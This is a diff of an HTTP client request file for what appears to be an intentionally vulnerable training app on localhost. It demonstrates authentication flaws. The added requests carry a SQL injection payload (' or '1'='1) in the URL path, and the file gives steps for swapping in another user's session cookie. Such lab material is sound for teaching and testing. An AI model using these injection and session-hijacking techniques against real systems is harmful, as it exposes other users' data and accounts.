@@ -1,20 +1,29 @@
-### Show what exactly is wrong, therefore expose information that can be used by the atacker
-
-### BAD USERNAME
-### see header Custom-Details: Bad username
-
-GET /flaws/ba
+# https://www.jetbrains.com/help/idea/http-client-in-product-code-editor.html#viewingResponse
+# after request save the Headers / Set-Cookie value for later use
+#@no-cookie-jar
+POST /flaws/ba/customers
 Host: localhost:8080
-Authorization: Basic user1 password1
+Content-Type: application/json
+Authorization: Basic user password
 
-### BAD PASSWORD
-### see header Custom-Details: Bad password
-GET /flaws/ba
+{
+  "name" : "rodi"
+}
+
+### injection FLAW will not pass basic auth, we still need to be authenticated
+
+#@no-cookie-jar
+GET /flaws/ba/customers/' or '1'='1
 Host: localhost:8080
-Authorization: Basic user password1
 
-### OK
+### FLAW with Authorization, if we are authenticated, we can get sensitive data form other users
 
-GET /flaws/ba
+#@no-cookie-jar
+GET /flaws/ba/customers/' or '1'='1
 Host: localhost:8080
 Authorization: Basic user password
+
+### FLAW with stolen cookie
+# Open customers url in browser http://localhost:8080/customers
+# Open Dev Console or F12 / Application / Storage - Cookies - http://localhost:8080
+# change value of the JSESSION cookie value with the one from Set-Cookies after POST request
